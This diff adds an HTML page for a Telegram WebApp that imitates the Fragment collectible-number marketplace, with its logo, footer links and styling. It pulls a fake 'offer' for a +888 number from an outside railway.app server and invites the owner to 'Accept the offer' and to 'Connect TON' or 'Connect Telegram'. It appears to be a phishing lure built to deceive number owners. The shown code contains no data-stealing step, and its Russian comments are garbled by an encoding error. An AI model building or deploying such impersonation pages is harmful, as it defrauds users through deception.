@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="utf-8">
+    <title>Fragment вЂў Offer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg:        #1a2026;
+            --card:      #212a33;
+            --hdr:       #212932;
+            --border:    #2a2f38;
+            --blue:      #4DB2FF;
+            --btn-blue:  #248bda;
+            --green:     #5AEC8C;
+            --muted:     #8C9AA9;
+            --white:     #FFFFFF;
+            --srch:      #2a3440;
+            --ps: 'Google Sans', 'Product Sans', system-ui, -apple-system, sans-serif;
+        }
+
+        * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+
+        html, body {
+            font-family: var(--ps);
+            background: var(--bg);
+            color: var(--white);
+            min-height: 100vh;
+            min-height: 100dvh;
+            overscroll-behavior: none;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        /* в”Ђв”Ђв”Ђ HEADER в”Ђв”Ђв”Ђ */
+        header {
+            height: 48px;
+            background: var(--hdr);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            align-items: stretch;
+        }
+
+        /* Logo section вЂ” NO border-right, icon Рё text РІРїР»РѕС‚РЅСѓСЋ */
+        .logo-section {
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            padding: 8px 10px 8px 12px;
+            /* border-right СѓР±СЂР°РЅ */
+        }
+        .logo-wrap {
+            display: flex;
+            align-items: center;
+            gap: 0;
+            text-decoration: none;
+        }
+        .logo-icon { width: 34px; height: 34px; flex-shrink: 0; }
+        /* margin-left РѕС‚СЂРёС†Р°С‚РµР»СЊРЅС‹Р№ вЂ” С‚РµРєСЃС‚ "Fragment" РїСЂРёР¶Р°С‚ Рє РёРєРѕРЅРєРµ */
+        .logo-text { height: 17px; width: auto; flex-shrink: 0; margin-left: -3px; }
+
+        /* Right part: search + burger flush to the right edge */
+        .right-section {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding-right: 8px;
+            gap: 4px;
+        }
+        .search-box {
+            position: relative;
+            width: 164px;
+            height: 28px;
+            background: var(--srch);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            overflow: hidden;
+            transition: background 0.15s ease;
+            flex-shrink: 0;
+        }
+        .search-box:focus-within {
+            background: #1e2c38;
+        }
+        .search-box svg {
+            position: absolute;
+            left: 9px;
+            flex-shrink: 0;
+            pointer-events: none;
+        }
+        .search-box input {
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            border: none;
+            outline: none;
+            padding: 6px 10px 6px 30px;
+            font-family: var(--ps);
+            font-size: 13px;
+            color: var(--white);
+            -webkit-appearance: none;
+            min-width: 0;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            overflow: hidden;
+            cursor: text;
+        }
+        .search-box input::placeholder {
+            color: var(--muted);
+        }
+
+        /* в”Ђв”Ђв”Ђ BURGER СЃ Р°РЅРёРјР°С†РёРµР№ РїРѕРІРѕСЂРѕС‚Р° в”Ђв”Ђв”Ђ */
+        .hamburger-btn {
+            width: 32px;
+            height: 32px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            flex-shrink: 0;
+        }
+        /* РљРѕРЅС‚РµР№РЅРµСЂ РёРєРѕРЅРєРё вЂ” РІСЂР°С‰Р°РµС‚СЃСЏ */
+        .burger-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            transition: transform 0.35s cubic-bezier(.4,0,.2,1);
+            width: 18px;
+            height: 14px;
+            position: relative;
+        }
+        .burger-icon span {
+            display: block;
+            width: 18px;
+            height: 2px;
+            background: #fff;
+            border-radius: 2px;
+            transition: transform 0.35s cubic-bezier(.4,0,.2,1),
+                        opacity   0.25s ease,
+                        width     0.35s cubic-bezier(.4,0,.2,1);
+            transform-origin: center;
+            position: absolute;
+        }
+        .burger-icon span:nth-child(1) { top: 0; }
+        .burger-icon span:nth-child(2) { top: 50%; margin-top: -1px; }
+        .burger-icon span:nth-child(3) { bottom: 0; }
+
+        /* РћС‚РєСЂС‹С‚Рѕ: РіРѕСЂРёР·РѕРЅС‚Р°Р»СЊРЅС‹Рµ РїРѕР»РѕСЃРєРё в†’ РєСЂРµСЃС‚ (Г— СЂРѕС‚Р°С†РёРµР№) */
+        .hamburger-btn.open .burger-icon span:nth-child(1) {
+            transform: translateY(7px) rotate(45deg);
+        }
+        .hamburger-btn.open .burger-icon span:nth-child(2) {
+            opacity: 0;
+            transform: scaleX(0);
+        }
+        .hamburger-btn.open .burger-icon span:nth-child(3) {
+            transform: translateY(-7px) rotate(-45deg);
+        }
+
+        /* в”Ђв”Ђв”Ђ PHONE + CLAIMED в”Ђв”Ђв”Ђ */
+        .number-line {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 16px 16px 14px;
+        }
+        .number-row-inner {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            max-width: 380px;
+            width: 100%;
+            justify-content: center;
+        }
+        .phone-number {
+            font-weight: 700;
+            font-size: 28px;
+            line-height: 28px;
+            color: var(--white);
+            white-space: nowrap;
+        }
+        .claimed-badge {
+            background: rgba(90,236,140,0.15);
+            color: var(--green);
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 6px;
+            height: 22px;
+            display: inline-flex;
+            align-items: center;
+            flex-shrink: 0;
+            white-space: nowrap;
+        }
+
+        /* в”Ђв”Ђв”Ђ WHAT IS THIS в”Ђв”Ђв”Ђ */
+        .what-card {
+            margin: 0 12px;
+            background: var(--card);
+            border-radius: 14px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+        }
+        .what-card-header {
+            background: #293440;
+            padding: 10px 16px;
+            border-bottom: 1px solid var(--border);
+        }
+        .what-title {
+            font-weight: 700;
+            font-size: 14px;
+            line-height: 18px;
+            color: var(--muted);
+        }
+        .what-card-body {
+            padding: 14px 16px 16px;
+        }
+        .offer-text {
+            font-weight: 400;
+            font-size: 13px;
+            line-height: 19px;
+            color: var(--white);
+            margin-bottom: 10px;
+        }
+        .ton-inline {
+            display: inline-flex;
+            align-items: center;
+            vertical-align: middle;
+            margin: 0 2px;
+            position: relative;
+            top: -1px;
+        }
+        .how-link {
+            font-weight: 400;
+            font-size: 14px;
+            line-height: 23px;
+            color: var(--blue);
+            text-decoration: none;
+        }
+        .how-link:hover { text-decoration: underline; }
+
+        /* в”Ђв”Ђв”Ђ ACCEPT BTN в”Ђв”Ђв”Ђ */
+        .accept-btn {
+            display: block;
+            width: 410px;
+            max-width: calc(100% - 24px);
+            margin: 14px auto;
+            padding: 12px 15px;
+            height: 42px;
+            background: var(--btn-blue);
+            color: var(--white);
+            font-family: var(--ps);
+            font-weight: 700;
+            font-size: 13px;
+            line-height: 18px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            text-align: center;
+            -webkit-appearance: none;
+            transition: opacity .15s;
+        }
+        .accept-btn:active { opacity: .8; }
+
+        /* в”Ђв”Ђв”Ђ COLLECTIBLE в”Ђв”Ђв”Ђ */
+        .collectible-card {
+            margin: 0 12px;
+            background: var(--card);
+            border-radius: 14px;
+            padding: 14px 16px 16px;
+        }
+        .collectible-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 6px;
+        }
+        .collectible-title {
+            font-weight: 700;
+            font-size: 14px;
+            line-height: 20px;
+            color: var(--white);
+        }
+        .collectible-number {
+            font-weight: 400;
+            font-size: 14px;
+            line-height: 20px;
+            color: var(--blue);
+        }
+        .collectible-desc {
+            font-weight: 400;
+            font-size: 14px;
+            line-height: 18px;
+            color: var(--muted);
+        }
+
+        /* в”Ђв”Ђв”Ђ SUBSCRIBE в”Ђв”Ђв”Ђ */
+        .subscribe {
+            font-weight: 400;
+            font-size: 14px;
+            line-height: 23px;
+            color: var(--blue);
+            text-align: center;
+            padding: 16px 16px 4px;
+            cursor: pointer;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        /* в”Ђв”Ђв”Ђ SECTION TITLES в”Ђв”Ђв”Ђ */
+        .section-title {
+            font-weight: 700;
+            font-size: 22px;
+            line-height: 36px;
+            color: var(--white);
+            padding: 0 12px;
+            margin: 16px 0 8px;
+        }
+
+        /* в”Ђв”Ђв”Ђ TABLES в”Ђв”Ђв”Ђ */
+        .table-wrap {
+            margin: 0 12px 8px;
+            background: var(--card);
+            border-radius: 14px;
+            overflow: hidden;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            table-layout: fixed;
+        }
+
+        thead th {
+            background: #293440;
+            padding: 10px 12px;
+            text-align: left;
+            font-weight: 700;
+            font-size: 14px;
+            line-height: 18px;
+            color: var(--muted);
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        tbody tr { border-top: 1px solid var(--border); }
+        tbody td {
+            padding: 12px 12px;
+            vertical-align: middle;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            max-width: 0;
+        }
+
+        .td-price-val {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-weight: 700;
+            font-size: 15px;
+            line-height: 19px;
+            color: var(--white);
+        }
+        .td-transferred {
+            font-weight: 700;
+            font-size: 15px;
+            line-height: 19px;
+            color: var(--white);
+        }
+        .td-date {
+            font-weight: 400;
+            font-size: 14px;
+            line-height: 19px;
+            color: var(--muted);
+        }
+        .td-wallet {
+            font-weight: 400;
+            font-size: 14px;
+            line-height: 19px;
+            color: var(--blue);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .wallet-link {
+            color: var(--blue);
+            text-decoration: none;
+            white-space: nowrap;
+            font-family: var(--ps);
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 19px;
+            display: inline-block;
+            max-width: 100%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            vertical-align: bottom;
+        }
+        .wallet-link:hover {
+            text-decoration: underline;
+            opacity: 0.85;
+        }
+
+        /* в”Ђв”Ђв”Ђ FOOTER SPACER в”Ђв”Ђв”Ђ */
+        .footer-spacer { height: 120px; }
+
+        /* в”Ђв”Ђв”Ђ FOOTER в”Ђв”Ђв”Ђ */
+        footer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            height: 44px;
+            background: #111417;
+            padding: 0 20px;
+            flex-wrap: wrap;
+        }
+        footer a {
+            font-size: 12px;
+            font-weight: 400;
+            color: #6D8394;
+            text-decoration: none;
+        }
+        footer a:hover { color: var(--muted); }
+        @supports (padding-bottom: env(safe-area-inset-bottom)) {
+            footer { height: calc(44px + env(safe-area-inset-bottom)); }
+        }
+
+        /* в”Ђв”Ђв”Ђ DRAWER в”Ђв”Ђв”Ђ */
+        .drawer-overlay{position:fixed;inset:0;background:rgba(0,0,0,0);z-index:200;pointer-events:none;transition:background .28s ease}
+        .drawer-overlay.open{background:rgba(0,0,0,.55);pointer-events:all}
+        .drawer{position:fixed;top:0;right:0;width:280px;height:100%;height:100dvh;background:#17212b;display:flex;flex-direction:column;z-index:201;transform:translateX(100%);transition:transform .28s cubic-bezier(.4,0,.2,1);box-shadow:-4px 0 24px rgba(0,0,0,.4)}
+        .drawer.open{transform:translateX(0)}
+        .drawer-close{position:absolute;top:12px;right:14px;width:36px;height:36px;background:none;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;padding:0;opacity:.8}
+        .drawer-close:hover{opacity:1}
+        .drawer-section-label{font-size:11px;font-weight:700;letter-spacing:.08em;color:var(--muted);padding:20px 20px 10px;text-transform:uppercase}
+        .drawer-menu{list-style:none;padding:0 10px}
+        .drawer-menu li a{display:flex;align-items:center;gap:14px;padding:13px 10px;border-radius:10px;text-decoration:none;color:var(--white);font-size:15px;font-weight:400;font-family:var(--ps);transition:background .15s}
+        .drawer-menu li a:hover,.drawer-menu li a:active{background:rgba(255,255,255,.07)}
+        .drawer-menu li a svg{flex-shrink:0;opacity:.9}
+        .drawer-bottom{margin-top:auto;padding:0 16px 28px;display:flex;flex-direction:column}
+        .drawer-hint{font-size:13px;color:var(--muted);text-align:center;line-height:18px;margin-bottom:14px}
+        .drawer-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;height:46px;border:none;border-radius:10px;font-family:var(--ps);font-size:15px;font-weight:700;cursor:pointer;transition:opacity .15s;margin-bottom:10px}
+        .drawer-btn:active{opacity:.8}
+        .drawer-btn.ton{background:var(--btn-blue);color:var(--white)}
+        .drawer-btn.telegram{background:#212a33;color:var(--white);border:1px solid var(--border);margin-bottom:0}
+    </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+    <!-- Logo: РёРєРѕРЅРєР° + С‚РµРєСЃС‚ "Fragment" РІРїР»РѕС‚РЅСѓСЋ, Р±РµР· СЂР°Р·РґРµР»РёС‚РµР»СЏ -->
+    <div class="logo-section">
+        <a class="logo-wrap" href="https://fragment.com" target="_blank" rel="noopener noreferrer">
+            <svg class="logo-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+                <path d="M126.3 153.6L252 209.2C255.2 210.7 259.2 210.5 264.2 208.2L388 153.5C394.6 151.1 390.9 143.7 385.7 144.5L129.1 143.4C121.9 143.7 119.9 150.9 126.3 153.6ZM116.2 182.1L234.6 366.1C238.3 372.1 247.7 368.7 247.4 363.3L247.2 237.1C247.1 230 245.3 228.4 240.8 226.5L122.4 173.8C118.1 171.4 112.3 175.4 116.2 182.1ZM267.5 234.8L267.8 361.8C267.9 370.3 276.4 371.9 281.3 364.7L384.2 205.3L386.4 201.9L388.3 199L388.3 198.9L399.1 182.3C402.4 176.8 397.2 170.5 389.4 174.2L272 227.1C271.8 227.2 271.6 227.3 271.4 227.4C269.9 228.3 268.9 229.2 268.4 230.3C267.7 231.5 267.5 233 267.5 234.8Z" fill="#fff" fill-rule="evenodd"/>
+            </svg>
+            <svg class="logo-text" viewBox="0 0 226 53" xmlns="http://www.w3.org/2000/svg">
+                <path d="m23.84 48h6.82v-18.91h8.8v-6.2h-8.8v-12.09h11.22v-6.2h-18.04zm21.81 0h6.82v-18.6h2.36c3.1 0 4.28 1.3 4.28 5.33v7.94c0 3.53.24 4.21.62 5.33h6.94c-.68-1.61-.74-3.16-.74-5.27v-7.63c0-4.89-1.12-8.12-4.53-9.17v-.13c3.04-1.24 4.46-4.09 4.46-8.55v-2.67c0-6.69-3.03-9.98-10.1-9.98h-10.11zm6.82-24.8v-12.4h3.1c2.42 0 3.47 1.36 3.47 4.46v3.35c0 3.47-1.55 4.59-4.09 4.59zm16.86 24.8h6.32l1.24-8.49h7.75v-.13l1.24 8.62h6.82l-7.07-43.4h-9.23zm8.37-14.38l2.97-21.46h.13l3.04 21.46zm28.32 15c6.7 0 10.17-3.97 10.17-10.91v-14.2h-9.86v6.2h3.41v8.49c0 3.1-1.36 4.22-3.53 4.22s-3.53-1.12-3.53-4.22v-23.74c0-3.1 1.36-4.28 3.53-4.28s3.53 1.18 3.53 4.28v4.15h6.45v-3.72c0-6.94-3.47-10.91-10.17-10.91c-6.69 0-10.16 3.97-10.16 10.91v22.82c0 6.94 3.47 10.91 10.16 10.91zm15.06-.62h5.95v-32.86h.13l4.96 32.86h5.7l4.96-32.86h.13v32.86h6.44v-43.4h-9.73l-4.34 31.06h-.12l-4.34-31.06h-9.74zm33.85 0h18.6v-6.2h-11.78v-13.33h9.36v-6.2h-9.36v-11.47h11.78v-6.2h-18.6zm22.99 0h6.08v-31.68h.12l8.18 31.68h7.01v-43.4h-6.08v25.98h-.12l-6.63-25.98h-8.56zm32.29 0h6.82v-37.2h7.13v-6.2h-21.08v6.2h7.13z" fill="#fff" fill-rule="evenodd"/>
+            </svg>
+        </a>
+    </div>
+
+    <!-- Right section: search + burger -->
+    <div class="right-section">
+        <div class="search-box">
+            <svg width="14" height="14" viewBox="0 0 16 20" xmlns="http://www.w3.org/2000/svg">
+                <g fill="none" fill-rule="evenodd" stroke="#8C9AA9" stroke-width="1.5">
+                    <ellipse cx="8.82" cy="8.35" rx="4.48" ry="4.64"/>
+                    <path d="m2 16 3.77-3.89" stroke-linecap="round"/>
+                </g>
+            </svg>
+            <input type="text" id="search-input" placeholder="Search phone num..." autocomplete="off" autocorrect="off" spellcheck="false">
+        </div>
+        <!-- Burger: С‚СЂРё span'Р° Р°РЅРёРјРёСЂСѓСЋС‚СЃСЏ РІ РєСЂРµСЃС‚ РїСЂРё РѕС‚РєСЂС‹С‚РёРё -->
+        <button class="hamburger-btn" id="hamburger-btn" aria-label="Menu">
+            <div class="burger-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </button>
+    </div>
+</header>
+
+<!-- PHONE + CLAIMED -->
+<div class="number-line">
+    <div class="number-row-inner">
+        <span class="phone-number" id="number-display">+888 0932 7614</span>
+        <span class="claimed-badge">Claimed</span>
+    </div>
+</div>
+
+<!-- WHAT IS THIS -->
+<div class="what-card">
+    <div class="what-card-header">
+        <div class="what-title">What is this?</div>
+    </div>
+    <div class="what-card-body">
+        <div class="offer-text" id="offer-text">Loading data from bot...</div>
+        <a href="https://fragment.com/about" class="how-link" target="_blank" rel="noopener noreferrer">How does this work?</a>
+    </div>
+</div>
+
+<!-- ACCEPT -->
+<button class="accept-btn" onclick="acceptOffer()">Accept the offer</button>
+
+<!-- COLLECTIBLE -->
+<div class="collectible-card">
+    <div class="collectible-row">
+        <span class="collectible-title">Collectible Number</span>
+        <span class="collectible-number" id="collectible-number"></span>
+    </div>
+    <div class="collectible-desc">This collectible number can be used to create a Telegram account not tied to a SIM card.</div>
+</div>
+
+<!-- SUBSCRIBE -->
+<div class="subscribe" onclick="">Subscribe to updates</div>
+
+<!-- BID HISTORY -->
+<div class="section-title">Bid History</div>
+<div class="table-wrap">
+    <table>
+        <colgroup>
+            <col style="width:26%">
+            <col style="width:40%">
+            <col style="width:34%">
+        </colgroup>
+        <thead>
+            <tr>
+                <th>Price</th>
+                <th>Date</th>
+                <th>From</th>
+            </tr>
+        </thead>
+        <tbody id="bid-tbody"></tbody>
+    </table>
+</div>
+
+<!-- OWNERSHIP HISTORY -->
+<div class="section-title">Ownership History</div>
+<div class="table-wrap">
+    <table>
+        <colgroup>
+            <col style="width:26%">
+            <col style="width:40%">
+            <col style="width:34%">
+        </colgroup>
+        <thead>
+            <tr>
+                <th>Sale price</th>
+                <th>Date</th>
+                <th>Buyer</th>
+            </tr>
+        </thead>
+        <tbody id="ownership-tbody"></tbody>
+    </table>
+</div>
+
+<div class="footer-spacer"></div>
+
+<!-- FOOTER -->
+<footer>
+    <a href="https://fragment.com/" target="_blank" rel="noopener noreferrer">Top Auctions</a>
+    <a href="https://fragment.com/about" target="_blank" rel="noopener noreferrer">About</a>
+    <a href="https://fragment.com/terms" target="_blank" rel="noopener noreferrer">Terms</a>
+    <a href="https://fragment.com/privacy" target="_blank" rel="noopener noreferrer">Privacy</a>
+</footer>
+
+<script>
+    const TON_ICON = `<svg height="19" viewBox="0 0 15 19" width="15" xmlns="http://www.w3.org/2000/svg"><path d="m1.74 4.5h11.51c.24 0 .44.2.44.44 0 .08-.02.15-.05.22l-5.46 9.9c-.24.43-.78.59-1.21.35-.15-.08-.27-.21-.36-.36l-5.26-9.9c-.12-.21-.04-.48.18-.6.07-.03.14-.05.21-.05zm5.76 10.67v-10.67z" fill="none" stroke="#4db2ff" stroke-width="1.5"/></svg>`;
+
+    const SERVER_URL = 'https://fr-production-3b30.up.railway.app';
+
+    function initApp() {
+        const tg = window.Telegram?.WebApp;
+        if (tg) tg.ready();
+
+        fetch(SERVER_URL + '/offer')
+            .then(r => {
+                if (!r.ok) throw new Error('No offer');
+                return r.json();
+            })
+            .then(data => renderData(data))
+            .catch(() => {
+                document.getElementById('offer-text').textContent = '❌ Не удалось загрузить данные';
+            });
+    }
+
+    function renderData(data) {
+            const num    = data.formatted_number || '+888 0932 7614';
+            const amount = Number(data.amount || 0).toLocaleString('en-US');
+
+            document.getElementById('number-display').textContent    = num;
+            document.getElementById('collectible-number').textContent = num;
+
+            document.getElementById('offer-text').innerHTML =
+                `Someone offered <span class="ton-inline">${TON_ICON}</span>` +
+                `<strong>${amount}</strong> for your <strong>${num}</strong>. ` +
+                `If the price suits you, press "Accept the offer".`;
+
+            const shortWallet = (w) => {
+                if (!w) return 'вЂ”';
+                const short = w.length <= 10 ? w : w.slice(0, 4) + '...' + w.slice(-3);
+                return `<a class="wallet-link" href="https://tonviewer.com/${w}" target="_blank" rel="noopener noreferrer" title="${w}">${short}</a>`;
+            };
+
+            const cleanDate = (raw) => {
+                if (!raw) return '';
+                // Match: Month Day [,Year] at HH:MM  OR  Day Month [,Year] at HH:MM
+                const re = /((?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d{1,2}|\d{1,2}\s+(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec))\s*(?:,?\s*\d{4})?\s+at\s+(\d{1,2}:\d{2})/i;
+                const m = raw.match(re);
+                if (m) return m[1].trim() + ' at ' + m[2];
+                return raw.replace(/,?\s*\d{4}/, '').trim();
+            };
+
+            const fillBidTable = (tbodyId, rows) => {
+                const tbody = document.getElementById(tbodyId);
+                tbody.innerHTML = '';
+                if (!rows || rows.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="3" class="td-date" style="text-align:center;padding:14px">No bid history available</td></tr>`;
+                    return;
+                }
+                rows.forEach(item => {
+                    const tr = document.createElement('tr');
+                    const isTransfer = (item.price || '') === 'Transferred';
+                    const priceCell  = isTransfer
+                        ? `<span class="td-transferred">Transferred</span>`
+                        : `<span class="td-price-val">${TON_ICON}${item.price}</span>`;
+                    tr.innerHTML =
+                        `<td>${priceCell}</td>` +
+                        `<td class="td-date">${cleanDate(item.date)}</td>` +
+                        `<td class="td-wallet">${shortWallet(item.buyer)}</td>`;
+                    tbody.appendChild(tr);
+                });
+            };
+
+            const fillOwnershipTable = (tbodyId, rows) => {
+                const tbody = document.getElementById(tbodyId);
+                tbody.innerHTML = '';
+                if (!rows || rows.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="3" class="td-date" style="text-align:center;padding:14px">РќРµС‚ РёСЃС‚РѕСЂРёРё РІР»Р°РґРµРЅРёСЏ</td></tr>`;
+                    return;
+                }
+                rows.forEach(item => {
+                    const tr = document.createElement('tr');
+                    const isTransfer = (item.price || '').toLowerCase().includes('transfer');
+                    const priceCell = isTransfer
+                        ? `<span class="td-transferred">Transferred</span>`
+                        : `<span class="td-price-val">${TON_ICON}${item.price}</span>`;
+                    tr.innerHTML =
+                        `<td>${priceCell}</td>` +
+                        `<td class="td-date">${cleanDate(item.date)}</td>` +
+                        `<td class="td-wallet">${shortWallet(item.buyer)}</td>`;
+                    tbody.appendChild(tr);
+                });
+            };
+
+            fillBidTable('bid-tbody',            data.bid_history);
+            fillOwnershipTable('ownership-tbody', data.history);
+
+    }
+
+    window.addEventListener('load', initApp);
+
+    function acceptOffer() { alert('вњ… Offer accepted!'); }
+
+    /* в”Ђв”Ђв”Ђ РџРѕРёСЃРє: РІРІРѕРґ СЂР°Р±РѕС‚Р°РµС‚, Enter РЅРёС‡РµРіРѕ РЅРµ РґРµР»Р°РµС‚ в”Ђв”Ђв”Ђ */
+    document.getElementById('search-input').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            e.stopPropagation();
+        }
+    });
+</script>
+
+<!-- DRAWER OVERLAY -->
+<div class="drawer-overlay" id="drawer-overlay"></div>
+
+<!-- DRAWER PANEL -->
+<div class="drawer" id="drawer">
+    <button class="drawer-close" id="drawer-close" aria-label="Close">
+        <svg height="18" viewBox="0 0 22 18" width="22" xmlns="http://www.w3.org/2000/svg">
+            <path d="m5 15 12-12m0 12-12-12" fill="none" stroke="#fff" stroke-linecap="round" stroke-width="1.733333"/>
+        </svg>
+    </button>
+
+    <div class="drawer-section-label">Platform</div>
+
+    <ul class="drawer-menu">
+        <li>
+            <a href="https://fragment.com/about" target="_blank" rel="noopener noreferrer">
+                <svg height="72" viewBox="0 0 72 72" width="72" xmlns="http://www.w3.org/2000/svg" style="width:22px;height:22px"><g fill="none" fill-rule="evenodd"><circle cx="36" cy="36" r="29" stroke="#fff" stroke-width="3.6"/><path d="m36 47.85v-14.64" stroke="#fff" stroke-linecap="round" stroke-width="4.4"/><circle cx="36" cy="24.77" fill="#fff" r="2.81"/></g></svg>
+                About
+            </a>
+        </li>
+        <li>
+            <a href="https://fragment.com/terms" target="_blank" rel="noopener noreferrer">
+                <svg height="72" viewBox="0 0 72 72" width="72" xmlns="http://www.w3.org/2000/svg" style="width:22px;height:22px"><g fill="none" fill-rule="evenodd" stroke="#fff" stroke-width="3.6"><rect height="56" rx="8" width="48" x="12" y="8"/><g stroke-linecap="round"><path d="m23.69 43.625h24.183"/><path d="m23.69 51.625h24.183"/><path d="m28 27.88 5.48 4.96c.1.09.25.08.34-.01l11.18-11.83"/></g></g></svg>
+                Terms
+            </a>
+        </li>
+        <li>
+            <a href="https://fragment.com/privacy" target="_blank" rel="noopener noreferrer">
+                <svg height="72" viewBox="0 0 72 72" width="72" xmlns="http://www.w3.org/2000/svg" style="width:22px;height:22px"><path d="m34.81 6.51c.76-.27 1.6-.27 2.36.01l22.1 8.02c.66.23 1.21.66 1.61 1.19.4.54.64 1.19.68 1.89.76 13.39-.33 23.34-3.12 29.89-2.78 6.48-9.36 12.53-19.96 17.98-.47.24-4.81.28-5.5-.02-10.9-4.77-17.74-10.82-20.72-17.98-3.05-7.32-3.84-17.33-2.26-30.07.09-.66.35-1.26.74-1.75.4-.49.93-.88 1.55-1.1zm-10.5 31.37 8.19 7.39c.15.14.38.13.51-.02l16.73-17.63" fill="none" stroke="#fff" stroke-linecap="round" stroke-width="3.6"/></svg>
+                Privacy Policy
+            </a>
+        </li>
+    </ul>
+
+    <div class="drawer-bottom">
+        <p class="drawer-hint">Connect TON and Telegram<br>to view your bids and assets</p>
+        <button class="drawer-btn ton">
+            <svg height="18" viewBox="0 0 17 18" width="17" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" stroke="#fff" stroke-width="1.7"><path d="m1.84 3h13.3c.28 0 .5.22.5.5 0 .09-.02.17-.06.25l-6.33 11.18c-.27.48-.88.65-1.36.38-.16-.09-.3-.23-.38-.39l-6.11-11.18c-.13-.24-.04-.55.2-.68.08-.04.16-.06.24-.06z"/><path d="m8.5 15v-12"/></g></svg>
+            Connect TON
+        </button>
+        <button class="drawer-btn telegram">
+            <svg height="18" viewBox="0 0 17 18" width="17" xmlns="http://www.w3.org/2000/svg"><path d="m.32 8.22c4.81-2.07 8.02-3.43 9.62-4.08 3.48-1.43 4.87-1.96 5.61-2.13.23-.06 1.45.29 1.45 1.18 0 2.58-1.32 8.8-1.87 11.67-.23 1.22-1.88 1.6-3.74.45-1.47-.91-2.27-1.52-3.68-2.44-1.63-1.05-.58-1.63.35-2.58.25-.25 4.47-4.03 4.55-4.37.01-.04.02-.2-.08-.29-.09-.08-.24-.05-.34-.03-.14.03-2.46 1.54-6.96 4.53-.66.44-1.25.66-1.79.65-.59-.02-1.15-.05-2.56-.6-.94-.37-1.13-1.02-.56-1.96z" fill="#fff" fill-rule="evenodd"/></svg>
+            Connect Telegram
+        </button>
+    </div>
+</div>
+
+<script>
+    /* в”Ђв”Ђв”Ђ Drawer + Burger animation в”Ђв”Ђв”Ђ */
+    const hamburgerBtn = document.getElementById('hamburger-btn');
+    const drawer       = document.getElementById('drawer');
+    const overlay      = document.getElementById('drawer-overlay');
+    const drawerClose  = document.getElementById('drawer-close');
+
+    function openDrawer() {
+        drawer.classList.add('open');
+        overlay.classList.add('open');
+        hamburgerBtn.classList.add('open');   // Р·Р°РїСѓСЃРєР°РµС‚ CSS-Р°РЅРёРјР°С†РёСЋ в†’ РєСЂРµСЃС‚
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closeDrawer() {
+        drawer.classList.remove('open');
+        overlay.classList.remove('open');
+        hamburgerBtn.classList.remove('open'); // РѕР±СЂР°С‚РЅР°СЏ Р°РЅРёРјР°С†РёСЏ в†’ С‚СЂРё РїРѕР»РѕСЃРєРё
+        document.body.style.overflow = '';
+    }
+
+    hamburgerBtn.addEventListener('click', openDrawer);
+    drawerClose.addEventListener('click',  closeDrawer);
+    overlay.addEventListener('click',      closeDrawer);
+</script>
+
+</body>
+</html>
